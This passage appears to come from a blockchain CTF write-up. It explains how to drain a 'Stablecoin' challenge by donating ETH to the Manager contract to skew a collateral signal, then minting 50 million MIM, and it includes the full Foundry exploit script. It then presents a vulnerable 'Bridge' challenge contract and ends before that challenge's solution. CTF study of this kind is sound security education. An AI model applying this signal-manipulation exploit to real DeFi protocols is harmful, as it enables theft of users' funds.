</span><span>            string(bytes.concat("mim", bytes(IERC20Metadata(address(token)).symbol()), "-c"))
</span><span>        );
</span><span>        ERC20Signal protocolDebtToken = new ERC20Signal(
</span><span>            address(this),
</span><span>            debtSignal,
</span><span>            string(bytes.concat("MIM ", bytes(IERC20Metadata(address(token)).name()), " debt")),
</span><span>            string(bytes.concat("mim", bytes(IERC20Metadata(address(token)).symbol()), "-d"))
</span><span>        );
</span><span>
</span><span>        if (address(collateralData[token].protocolCollateralToken) != address(0)) {
</span><span>            revert CollateralTokenAlreadyAdded();
</span><span>        }
</span><span>
</span><span>        Collateral memory protocolCollateralTokenInfo;
</span><span>        protocolCollateralTokenInfo.protocolCollateralToken = protocolCollateralToken;
</span><span>        protocolCollateralTokenInfo.protocolDebtToken = protocolDebtToken;
</span><span>        protocolCollateralTokenInfo.priceFeed = priceFeed;
</span><span>
</span><span>        collateralData[token] = protocolCollateralTokenInfo;
</span><span>    }
</span><span>
</span><span>    function _updateDebt(IERC20 token, ERC20Signal protocolDebtToken, uint256 debtDelta, bool debtIncrease) internal {
</span><span>        if (debtDelta == 0) {
</span><span>            return;
</span><span>        }
</span><span>
</span><span>        if (debtIncrease) {
</span><span>            _decayRate(token);
</span><span>
</span><span>            protocolDebtToken.mint(msg.sender, debtDelta);
</span><span>            mim.mint(msg.sender, debtDelta);
</span><span>        } else {
</span><span>            protocolDebtToken.burn(msg.sender, debtDelta);
</span><span>            mim.burn(msg.sender, debtDelta);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function _updateCollateral(
</span><span>        IERC20 token,
</span><span>        ERC20Signal protocolCollateralToken,
</span><span>        uint256 collateralDelta,
</span><span>        bool collateralIncrease
</span><span>    ) internal {
</span><span>        if (collateralDelta == 0) {
</span><span>            return;
</span><span>        }
</span><span>
</span><span>        if (collateralIncrease) {
</span><span>            protocolCollateralToken.mint(msg.sender, collateralDelta);
</span><span>            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
</span><span>        } else {
</span><span>            protocolCollateralToken.burn(msg.sender, collateralDelta);
</span><span>            token.safeTransfer(msg.sender, collateralDelta);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function _updateSignals(
</span><span>        IERC20 token,
</span><span>        ERC20Signal protocolCollateralToken,
</span><span>        ERC20Signal protocolDebtToken,
</span><span>        uint256 totalDebtForCollateral
</span><span>    ) internal {
</span><span>        protocolDebtToken.setSignal(totalDebtForCollateral);
</span><span>        protocolCollateralToken.setSignal(token.balanceOf(address(this)));
</span><span>    }
</span><span>
</span><span>    function updateSignal(ERC20Signal token, uint256 signal) external onlyOwner {
</span><span>        token.setSignal(signal);
</span><span>    }
</span><span>
</span><span>    function _closePosition(
</span><span>        ERC20Signal protocolCollateralToken,
</span><span>        ERC20Signal protocolDebtToken,
</span><span>        address position,
</span><span>        bool burn
</span><span>    ) internal {
</span><span>        positionCollateral[position] = IERC20(address(0));
</span><span>
</span><span>        if (burn) {
</span><span>            protocolDebtToken.burn(position, type(uint256).max);
</span><span>            protocolCollateralToken.burn(position, type(uint256).max);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function _decayRate(IERC20 token) internal {
</span><span>        uint256 decayedRate = _calcDecayedRate(token);
</span><span>        require(decayedRate <= ProtocolMath.ONE);
</span><span>
</span><span>        collateralData[token].baseRate = decayedRate;
</span><span>
</span><span>        _updateOperationTime(token);
</span><span>    }
</span><span>
</span><span>    function _updateOperationTime(IERC20 token) internal {
</span><span>        uint256 pastTime = block.timestamp - collateralData[token].operationTime;
</span><span>
</span><span>        if (1 minutes <= pastTime) {
</span><span>            collateralData[token].operationTime = block.timestamp;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function _calcDecayedRate(IERC20 token) internal view returns (uint256) {
</span><span>        uint256 pastMinutes = (block.timestamp - collateralData[token].operationTime) / 1 minutes;
</span><span>        uint256 decay = ProtocolMath._decPow(DECAY_FACTOR, pastMinutes);
</span><span>
</span><span>        return collateralData[token].baseRate.mulDown(decay);
</span><span>    }
</span><span>
</span><span>    function _checkPosition(IERC20 token, uint256 debt, uint256 collateral) internal view {
</span><span>        if (debt < MIN_DEBT) {
</span><span>            revert NetDebtBelowMinimum(debt);
</span><span>        }
</span><span>
</span><span>        (uint256 price,) = collateralData[token].priceFeed.fetchPrice();
</span><span>        uint256 health = ProtocolMath._computeHealth(collateral, debt, price);
</span><span>        if (health < MIN_CR) {
</span><span>            revert NewICRLowerThanMCR(health);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    receive() external payable {}
</span><span>}
</span><span>contract Stablecoin {
</span><span>    Token public immutable mim;
</span><span>    Token public immutable eth;
</span><span>    Manager public immutable manager;
</span><span>    address public player;
</span><span>    constructor(address _player, Token _mim, Token _eth, Manager _manager) {
</span><span>        player = _player;
</span><span>        mim = _mim;
</span><span>        eth = _eth;
</span><span>        manager = _manager;
</span><span>    }
</span><span>    function isSolved() external view returns (bool) {
</span><span>        return mim.balanceOf(player) == 50_000_000 ether;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-5><a aria-label="Anchor link for: solution-5" class=zola-anchor href=#solution-5>Solution</a></h2><p>Bro, this is pain I couldn't remember what I did to solve this. Spent more than 3 days (I know I'm dumb). By doing some magic I was to solve this in the end. I'll try my best to explain that magic.<p>Lets break down the StableCoin protocol,<ol><li><p><strong>Manager (Main Contract)</strong></p> <ul><li>Handles adding collateral tokens, managing positions, and liquidations<li>Maintains collateral and debt signals for each position<li>Controls the MIM token minting and burning<li>Key functions: <ul><li><code>manage()</code>: Add/remove collateral and debt<li><code>liquidate()</code>: Liquidate undercollateralized positions<li><code>addCollateralToken()</code>: Add new collateral types<li><code>updateSignal()</code>: Update collateral/debt signals</ul></ul><li><p><strong>Token</strong></p> <ul><li>ERC20 token contract for MIM stablecoin<li>Can only be minted/burned by the Manager</ul><li><p><strong>ERC20Signal</strong></p> <ul><li>Special ERC20 implementation for protocol collateral and debt tokens<li>Uses a signal multiplier for balance calculations<li>Cannot be transferred (all transfer functions revert)<li>Key functions: <ul><li><code>mint()</code>: Mints tokens with signal adjustment<li><code>burn()</code>: Burns tokens with signal adjustment<li><code>setSignal()</code>: Updates the signal multiplier</ul></ul><li><p><strong>PriceFeed</strong></p> <ul><li>Simple price oracle that returns fixed prices<li>Returns (2207 ether, 0.01 ether) for price and timestamp</ul><li><p><strong>Stablecoin</strong></p> <ul><li>Challenge contract that sets up the initial state<li>Holds references to MIM, ETH tokens, and Manager</ul></ol><p>The goal is to get 50,000,000 MIM tokens when starting with 6000 ETH.<p>The Manager owner did the following after protocol deployement,<ol><li>The protocol adds ETH as collateral with a simple price feed and very high limits<li>Creates an initial position with 2 ETH collateral and 3395 MIM debt<li>Updates the debt token's signal to 3520 ether (this affects debt calculations)</ol><p>Same routene, initial state of the protocol.<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span>  </span><span style=color:#f29718>Stablecoin</span><span> :  0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9
</span><span>  </span><span style=color:#f29718>Manager</span><span> :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
</span><span>  </span><span style=color:#f29718>Manager</span><span> Owner:  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
</span><span>  </span><span style=color:#f29718>MIM</span><span> :  0x7a2B13B63367219128DD46d1ab179a542C17d48a
</span><span>  </span><span style=color:#f29718>MIM</span><span> Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
</span><span>  </span><span style=color:#f29718>ETH</span><span> :  0xc673093EC4446A0690Aeb98105faeB8528c50693
</span><span>  </span><span style=color:#f29718>ETH</span><span> Manager :  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
</span><span>  </span><span style=color:#f29718>protocolCollateralToken</span><span> :  0xfe49524fEe1b2FeF5Dff149B1A0370cff0d68972
</span><span>  </span><span style=color:#f29718>protocolCollateralToken</span><span> Signal:  20000000000000000000000000000000000
</span><span>  </span><span style=color:#f29718>protocolCollateralToken</span><span> totalSupply()</span><span style=color:#f07171>:</span><span>  2000000000000000000
</span><span>  </span><span style=color:#f29718>protocolDebtToken</span><span> :  0x89cAaD14ca4eEA0272A2654A31A56D0a509E28fF
</span><span>  </span><span style=color:#f29718>protocolDebtToken</span><span> Signal :  1036818851251840943
</span><span>  </span><span style=color:#f29718>protocolDebtToken</span><span> totalSupply()</span><span style=color:#f07171>:</span><span>  3520000000000000001485
</span><span>  </span><span style=color:#f29718>-------------------------------
</span><span>  </span><span style=color:#f29718>Manager</span><span> balance of ETH :  2000000000000000000
</span><span>  </span><span style=color:#f29718>Manager</span><span> balance of MIM :  0
</span><span>  </span><span style=color:#f29718>Manager</span><span> Owner balance of ETH :  0
</span><span>  </span><span style=color:#f29718>Manager</span><span> Owner balance of MIM :  3395000000000000000000
</span><span>  </span><span style=color:#f29718>Manager</span><span> Owner balance of protocolCollateralToken :  2000000000000000000
</span><span>  </span><span style=color:#f29718>Manager</span><span> Owner balance of protocolDebtToken :  3520000000000000001485
</span><span>  </span><span style=color:#f29718>Player</span><span> balance of ETH :  6000000000000000000000
</span><span>  </span><span style=color:#f29718>Player</span><span> balance of MIM :  0
</span><span>  </span><span style=color:#f29718>Player</span><span> balance of protocolCollateralToken :  0
</span><span>  </span><span style=color:#f29718>Player</span><span> balance of protocolDebtToken :  0
</span><span>  </span><span style=color:#f29718>protocolCollateralToken</span><span> Signal:  20000000000000000000000000000000000
</span><span>  </span><span style=color:#f29718>protocolDebtToken</span><span> Signal :  1036818851251840943
</span></code></pre><p>When the Manager owner added the collatoral token as ETH, <code>protocolCollateralToken</code> and <code>protocolDebtToken</code> will be deployed. And curresponding signal values are added by the owner.<p>Lets do the backtracking, our goal is to get the MIM tokens, where the transfer/mint of MIM happens? In the <code>_updateDebt()</code> internal function which is called at once in <code>manage()</code>.<p>So, need to understand what does this <code>manage()</code> function do. When called, it can either add or remove ETH collateral and mint or burn MIM tokens. When adding collateral, it transfers ETH from the user to the Manager and mints protocolCollateralToken to the user. When minting MIM, it creates new MIM tokens and mints protocolDebtToken to track the debt. The function uses a signal-based system where both collateral and debt tokens have signal multipliers that affect the actual balances and health calculations. The protocol checks the position's health factor after each operation to ensure proper collateralization.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>    function _updateCollateral(
</span><span>        IERC20 token,
</span><span>        ERC20Signal protocolCollateralToken,
</span><span>        uint256 collateralDelta,
</span><span>        bool collateralIncrease
</span><span>    ) internal {
</span><span>        if (collateralDelta == 0) {
</span><span>            return;
</span><span>        }
</span><span>
</span><span>        if (collateralIncrease) {
</span><span>            protocolCollateralToken.mint(msg.sender, collateralDelta);
</span><span>            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
</span><span>        } else {
</span><span>            protocolCollateralToken.burn(msg.sender, collateralDelta);
</span><span>            token.safeTransfer(msg.sender, collateralDelta);
</span><span>        }
</span><span>    }
</span></code></pre><p>If we observe here, While adding collatoral the collatoral token will be transferred from user to Manager and the <code>protocolCollateralToken</code> is also minted to track the user collatoral amount. And this collatoral amount will affects the health of the user. If we closely look at the <code>protocolCollateralToken.mint(msg.sender, collateralDelta)</code> line.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function mint(address to, uint256 amount) external onlyManager {
</span><span>    _mint(to, amount.divUp(signal));
</span><span>}
</span></code></pre><p>Hmm, something is interesting, its not the usual mint. mint amount is calculated by doing <code>divUp</code> with the <code>signal</code>. So, can we make this <code>divUp()</code> calculation to result very large amount so that our <code>protocolCollatoralToken</code> coallatoral will be high and we can get more <code>mim</code> tokens due to increase of collatoral and health factor.<p>Okay, now how can we do this? By modifying the <code>signal</code> value.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// Manager
</span><span>function _updateSignals(
</span><span>    IERC20 token,
</span><span>    ERC20Signal protocolCollateralToken,
</span><span>    ERC20Signal protocolDebtToken,
</span><span>    uint256 totalDebtForCollateral
</span><span>) internal {
</span><span>    protocolDebtToken.setSignal(totalDebtForCollateral);
</span><span>    protocolCollateralToken.setSignal(token.balanceOf(address(this)));
</span><span>}
</span><span>
</span><span>// ERC20Signal 
</span><span>function setSignal(uint256 backingAmount) external onlyManager {
</span><span>    uint256 supply = ERC20.totalSupply();
</span><span>    uint256 newSignal = (backingAmount == 0 && supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
</span><span>    signal = newSignal;
</span><span>}
</span></code></pre><p>The <code>_updateSignals()</code> is called inside the <code>liquidate()</code> function. So, liquidating the manager owner will update the signals. The <code>protocolCollatoralToken</code> signal is updated with the value of <code>token.balanceOf(address(this))</code>, token here is ETH. So, since it is calculating the balance of <code>address(this)</code>, i.e manager. We can donate ETH to manager by doing <code>eth.transfer(address(manager), (large ETH)</code>. Now this causes an undefined behaviour in <code>setSignal()</code> function and the <code>backingAmount.divUp(supply)</code> will execute which make the signal value very low than compared to the initial one.<p>So, we succeeded in manipulating the <code>protocolCollatoralToken</code> signal. Now the signal of the <code>protocolCollatoralToken</code> is smaller (at least less than 1e18). Now what happens if we call the <code>manage()</code> again with very small increase in <code>collatoralToken</code>?<p>Lets say, we called <code>manage(eth, 1 , true, 0, false)</code>. Now ultimately the following <code>mint()</code> will execute. So, now the signal showing up here is the manipulated one (we reduced it to less than 1e18).<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function mint(address to, uint256 amount) external onlyManager {
</span><span>    _mint(to, amount.divUp(signal));
</span><span>}
</span><span>
</span><span>function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
</span><span>    if (a == 0) {
</span><span>        return 0;
</span><span>    } else {
</span><span>        return (((a * ONE) - 1) / b) + 1;
</span><span>    }
</span><span>}
</span></code></pre><p>So, the result from the <code>divUp()</code> will be very high. i.e, we are minting more <code>protocolCollatoralToken</code> by only sending only <code>1 wei</code> of ETH. But this <code>manage()</code> with only 1 wei collatoral increase should be done for several times till we got the good health factor. Once we have the very good health factor and we can able to borrow all <code>50,000,000</code> MIM in one go.<p>Find my messy exploit below,<div class=note-container><button class=note-toggle><div class=note-icon><p>Stablecoin.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>
</span><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>
</span><span>import "../src/Stablecoin.sol";
</span><span>
</span><span>contract StablecoinSolve is Script {
</span><span>
</span><span>    Stablecoin public stablecoin = Stablecoin(0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9);
</span><span>    Manager public manager = stablecoin.manager();
</span><span>    Token public mim = stablecoin.mim();
</span><span>    Token public eth = stablecoin.eth();
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>
</span><span>    //Manager owner executes the following code:
</span><span>
</span><span>    // manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);
</span><span>
</span><span>    // ETH.mint(address(this), 2 ether);
</span><span>    // ETH.approve(address(manager), type(uint256).max);
</span><span>    // manager.manage(ETH, 2 ether, true, 3395 ether, true);
</span><span>
</span><span>    // (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
</span><span>    // manager.updateSignal(debtToken, 3520 ether);
</span><span>
</span><span>    function run() external{
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        console.log("Stablecoin : ", address(stablecoin));
</span><span>        console.log("Manager : ", address(manager));
</span><span>        console.log("Manager Owner: ", address(manager.owner()));
</span><span>
</span><span>        console.log("MIM : ", address(mim));
</span><span>        console.log("MIM Manager : ", address(mim.manager()));
</span><span>
</span><span>        console.log("ETH : ", address(eth));
</span><span>        console.log("ETH Manager : ", address(eth.manager()));
</span><span>        
</span><span>        (ERC20Signal protocolCollateralToken,
</span><span>        ERC20Signal protocolDebtToken,
</span><span>        PriceFeed priceFeed,
</span><span>        uint256 operationTime,
</span><span>        uint256 baseRate ) =  manager.collateralData(IERC20(eth));
</span><span>        console.log("protocolCollateralToken : ", address(protocolCollateralToken));
</span><span>        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
</span><span>        console.log("protocolCollateralToken totalSupply(): ", protocolCollateralToken.totalSupply());
</span><span>
</span><span>        console.log("protocolDebtToken : ", address(protocolDebtToken));
</span><span>        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
</span><span>        console.log("protocolDebtToken totalSupply(): ", protocolDebtToken.totalSupply());
</span><span>
</span><span>        console.log("-------------------------------");
</span><span>        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
</span><span>        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
</span><span>        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
</span><span>        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
</span><span>        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
</span><span>        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
</span><span>        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
</span><span>        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
</span><span>        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
</span><span>        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
</span><span>        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
</span><span>        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
</span><span>        console.log("-------------------------------");
</span><span>
</span><span>
</span><span>        console.log("isSolved() : ", stablecoin.isSolved());
</span><span>
</span><span>        mim.approve(address(manager), type(uint256).max );
</span><span>        eth.approve(address(manager), type(uint256).max );
</span><span>        manager.manage(eth, 2.1 ether, true, 3521 ether, true);
</span><span>        eth.transfer(address(manager), 5990 ether);
</span><span>        manager.liquidate(manager.owner());
</span><span>        for (uint i = 0; i < 850; i++){
</span><span>            manager.manage(eth, 1 , true, 0, false);
</span><span>        }
</span><span>        manager.manage(eth, 0 , false, 50_000_000 ether , true);
</span><span>        mim.transfer(address(0xdeadbeef), mim.balanceOf(player) - 50_000_000 ether);
</span><span>
</span><span>        
</span><span>        console.log("-------------------------------");
</span><span>        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
</span><span>        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
</span><span>        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
</span><span>        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
</span><span>        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
</span><span>        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
</span><span>        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
</span><span>        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
</span><span>        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
</span><span>        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
</span><span>        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
</span><span>        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
</span><span>        console.log("-------------------------------");
</span><span>
</span><span>        console.log("isSolved() : ", stablecoin.isSolved());
</span><span>        // revert();
</span><span>    }
</span><span>
</span><span>}
</span></code></pre></div></div><hr><h1 id=bridge><a aria-label="Anchor link for: bridge" class=zola-anchor href=#bridge>Bridge</a></h1><p>P: "You've stumbled upon a cross-chain bridge contract, enabling ETH and ERC20 token transfers between chains. The Bridge contract has 100 ether of flag token. You are given 1 ether of flag token. Your goal is to drain Bridge contract below 90 ether."<div class=note-container><button class=note-toggle><div class=note-icon><p>Bridge.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>//SPDX-License-Identifier:MIT
</span><span>pragma solidity ^0.8.20;
</span><span>
</span><span>import {Address} from "@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol";
</span><span>import {IERC20, IERC20Metadata} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/extensions/IERC20Metadata.sol";
</span><span>import {ERC20} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
</span><span>import {ERC777} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC777/ERC777.sol";
</span><span>
</span><span>contract Bridge {
</span><span>    uint256 public immutable CHAIN_ID;
</span><span>    address public immutable FLAG_TOKEN;
</span><span>    address public relayer;
</span><span>    mapping(uint256 => address) public remoteBridge;
</span><span>    mapping(address => uint256) public remoteBridgeChainId;
</span><span>    mapping(uint256 => mapping(address => bool)) public isTokenRegisteredAtRemote;
</span><span>
</span><span>    uint256 internal msgNonce;
</span><span>    mapping(bytes32 => bool) public relayedMessages;
</span><span>    uint256 public relayedMessageSenderChainId;
</span><span>    address public relayedMessageSenderAddress;
</span><span>    mapping(address => address) public remoteTokenToLocalToken;
</span><span>    mapping(address => bool) public isBridgedERC20;
</span><span>
</span><span>    event SendRemoteMessage(
</span><span>        uint256 indexed targetChainId,
</span><span>        address indexed targetAddress,
</span><span>        address indexed sourceAddress,
</span><span>        uint256 msgValue,
</span><span>        uint256 msgNonce,
</span><span>        bytes msgData
</span><span>    );
</span><span>    event RelayedMessage(bytes32 indexed msgHash);
</span><span>
</span><span>    event ETH_transfer(address indexed to, uint256 amount);
</span><span>    event ERC20_register(address indexed token, string name, string symbol);
</span><span>    event ERC20_transfer(address indexed token, address indexed to, uint256 amount);
</span><span>
</span><span>    constructor(address _relayer, address flagToken, uint256 chainId) {
</span><span>        relayer = _relayer;
</span><span>        FLAG_TOKEN = flagToken;
</span><span>        CHAIN_ID = chainId;
</span><span>    }
</span><span>
</span><span>    modifier onlyRelayer() {
</span><span>        require(msg.sender == relayer, "R");
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    modifier onlyRemoteBridge() {
</span><span>        uint256 senderChainId = Bridge(payable(msg.sender)).relayedMessageSenderChainId();
</span><span>        require(
</span><span>            msg.sender == remoteBridge[senderChainId] && senderChainId != 0
</span><span>                && remoteBridgeChainId[msg.sender] == senderChainId,
</span><span>            "RB"
</span><span>        );
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    function isSolved() external view returns (bool) {
</span><span>        return IERC20(FLAG_TOKEN).balanceOf(address(this)) < 90 ether;
</span><span>    }
</span><span>
</span><span>    function registerRemoteBridge(uint256 _remoteChainId, address _remoteBridge) external onlyRelayer {
</span><span>        remoteBridge[_remoteChainId] = _remoteBridge;
</span><span>        remoteBridgeChainId[_remoteBridge] = _remoteChainId;
</span><span>    }
</span><span>
</span><span>    receive() external payable virtual {
</span><span>        require(msg.sender == tx.origin, "Only EOA");
</span><span>        ethOut(msg.sender);
</span><span>    }
</span><span>
</span><span>    function ethOut(address _to) public payable virtual {
</span><span>        emit ETH_transfer(_to, msg.value);
</span><span>        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
</span><span>        address _remoteBridge = remoteBridge[_remoteChainId];
</span><span>        this.sendRemoteMessage{value: msg.value}(
</span><span>            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ethIn.selector, _to)
</span><span>        );
</span><span>    }
</span><span>
</span><span>    function ethIn(address _to) external payable onlyRemoteBridge {
</span><span>        emit ETH_transfer(_to, msg.value);
</span><span>        Address.sendValue(payable(_to), msg.value);
</span><span>    }
</span><span>
</span><span>    function ERC20Out(address _token, address _to, uint256 _amount) external {
</span><span>        emit ERC20_transfer(_token, _to, _amount);
</span><span>
</span><span>        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
</span><span>        address _remoteBridge = remoteBridge[_remoteChainId];
</span><span>
</span><span>        if (isBridgedERC20[_token]) {
</span><span>            BridgedERC20(_token).burn(msg.sender, _amount);
</span><span>            _token = BridgedERC20(_token).REMOTE_TOKEN();
</span><span>        } else {
</span><span>            uint256 balance = IERC20(_token).balanceOf(address(this));
</span><span>            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
</span><span>            _amount = IERC20(_token).balanceOf(address(this)) - balance;
</span><span>            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
</span><span>                this.sendRemoteMessage(
</span><span>                    _remoteChainId,
</span><span>                    _remoteBridge,
</span><span>                    abi.encodeWithSelector(
</span><span>                        Bridge.ERC20Register.selector,
</span><span>                        _token,
</span><span>                        IERC20Metadata(_token).name(),
</span><span>                        IERC20Metadata(_token).symbol()
</span><span>                    )
</span><span>                );
</span><span>                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
</span><span>            }
</span><span>        }
</span><span>
</span><span>        this.sendRemoteMessage(
</span><span>            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
</span><span>        );
</span><span>    }
</span><span>
</span><span>    function ERC20Register(address _remoteToken, string memory _name, string memory _symbol)
</span><span>        external
</span><span>        onlyRemoteBridge
</span><span>    {
</span><span>        emit ERC20_register(_remoteToken, _name, _symbol);
</span><span>
</span><span>        if (remoteTokenToLocalToken[_remoteToken] == address(0)) {
</span><span>            address _token = address(new BridgedERC20(msg.sender, _remoteToken, _name, _symbol));
</span><span>            remoteTokenToLocalToken[_remoteToken] = _token;
</span><span>            isBridgedERC20[_token] = true;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function ERC20In(address _token, address _to, uint256 _amount) external payable onlyRemoteBridge {
</span><span>        emit ERC20_transfer(_token, _to, _amount);
</span><span>
</span><span>        if (remoteTokenToLocalToken[_token] != address(0)) {
</span><span>            BridgedERC20(remoteTokenToLocalToken[_token]).mint(_to, _amount);
</span><span>        } else {
</span><span>            require(IERC20(_token).transfer(_to, _amount), "T");
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function sendRemoteMessage(uint256 _targetChainId, address _targetAddress, bytes calldata _message)
</span><span>        public
</span><span>        payable
</span><span>    {
</span><span>        require(msg.sender == address(this), "S");
</span><span>        require(_targetChainId != CHAIN_ID, "C");
</span><span>        require(_targetAddress != address(0), "A");
</span><span>        emit SendRemoteMessage(_targetChainId, _targetAddress, msg.sender, msg.value, msgNonce, _message);
</span><span>        
</span><span>        uint256 _sourceChainId = CHAIN_ID;
</span><span>        address _sourceAddress = address(this);
</span><span>
</span><span>        bytes32 h = keccak256(
</span><span>            abi.encodeWithSignature(
</span><span>                "relayMessage(address,uint256,address,uint256,uint256,bytes)",
</span><span>                _targetAddress,
</span><span>                _sourceChainId,
</span><span>                _sourceAddress,
</span><span>                msg.value,
</span><span>                msgNonce,
</span><span>                _message
</span><span>            )
</span><span>        );
</span><span>        require(relayedMessages[h] == false, "H");
</span><span>        relayedMessages[h] = true;
</span><span>        emit RelayedMessage(h);
</span><span>        relayedMessageSenderChainId = _sourceChainId;
</span><span>        relayedMessageSenderAddress = _sourceAddress;
</span><span>        (bool success, bytes memory result) = _targetAddress.call{value: msg.value}(_message);
</span><span>        require(success, string(result));
</span><span>        relayedMessageSenderChainId = 0;
</span><span>        relayedMessageSenderAddress = address(0);
</span><span>
</span><span>        unchecked {
</span><span>            ++msgNonce;
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Token is ERC777 {
</span><span>    constructor(address user, address[] memory a) ERC777("Token", "Tok", a) {
</span><span>        _mint(msg.sender, 100 ether, "", "", false);
</span><span>        _mint(user, 1 ether, "", "", false);
</span><span>    }
</span><span>}
</span><span>
</span><span>contract BridgedERC20 is ERC20 {
</span><span>    Bridge public immutable BRIDGE;
</span><span>    Bridge public immutable REMOTE_BRIDGE;
</span><span>    address public immutable REMOTE_TOKEN;
</span><span>
</span><span>    modifier onlyBridge() {
</span><span>        require(msg.sender == address(BRIDGE), "B");
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    modifier onlyRemoteBridge() {
</span><span>        require(msg.sender == address(BRIDGE), "RB1");
</span><span>        require(
</span><span>            REMOTE_BRIDGE.relayedMessageSenderChainId() != 0
</span><span>                && BRIDGE.remoteBridgeChainId(REMOTE_BRIDGE.relayedMessageSenderAddress()) == REMOTE_BRIDGE.relayedMessageSenderChainId(),
</span><span>            "RB2"
</span><span>        );
</span><span>        _;
</span><span>    }
</span><span>    constructor(address _remoteBridge, address _remoteToken, string memory _name, string memory _symbol) ERC20(_name, _symbol) {
</span><span>        BRIDGE = Bridge(payable(msg.sender));
</span><span>        REMOTE_BRIDGE = Bridge(payable(_remoteBridge));
</span><span>        REMOTE_TOKEN = _remoteToken;
</span><span>    }
</span><span>
</span><span>    function mint(address _to, uint256 _amount) external onlyRemoteBridge {
</span><span>        _mint(_to, _amount);
</span><span>    }
</span><span>
</span><span>    function burn(address _from, uint256 _amount) external onlyBridge {
</span><span>        _burn(_from, _amount);
</span><span>    }
</span><span>}
